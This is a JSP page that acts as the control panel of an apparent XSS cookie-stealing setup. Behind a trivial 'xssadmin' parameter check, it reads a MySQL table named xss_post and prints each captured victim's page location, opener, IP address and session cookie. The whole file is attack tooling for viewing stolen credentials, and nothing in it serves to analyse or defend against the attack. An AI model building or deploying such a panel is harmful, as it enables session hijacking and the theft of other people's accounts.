<%@ page language="java" import="java.util.*"pageEncoding="UTF-8"%>
<%@ page import="java.sql.*"%>
<%@ page import="com.mysql.jdbc.Driver"%>

<%
if(request.getParameter("xssadmin")==null)
{
out.print("Are you hacking me?");
return;
}
String path = request.getContextPath();

String basePath = request.getScheme() + "://" +request.getServerName() + ":" +request.getServerPort() + path +"/";  

String driverName = "com.mysql.jdbc.Driver";

String DBUser = "xsser";

String DBPasswd = "xxxxxxxx";

String DBName = "xsss";

String connUrl = "jdbc:mysql://localhost/" + DBName +"?user=" + DBUser +"&password=" + DBPasswd;

Class.forName(driverName).newInstance();

Connection conn = DriverManager.getConnection(connUrl);

Statement stmt = conn.createStatement();

String sql = "SELECT * FROM xss_post order by id desc";

ResultSet rs = stmt.executeQuery(sql);

ResultSetMetaData xssData = rs.getMetaData();

while(rs.next()) {

out.print("id:"+rs.getString("id")+"<br>"); 
out.print("location:"+rs.getString("location")+"<br>"); 
out.print("toplocation:"+rs.getString("toplocation")+"<br>"); 
out.print("cookie:"+rs.getString("cookie")+"<br>"); 
out.print("opener:"+rs.getString("opener")+"<br>"); 
out.print("ip:"+rs.getString("ip")+"<hr>"); 

} 

%>

<% 
rs.close();
stmt.close();
conn.close();	
%>
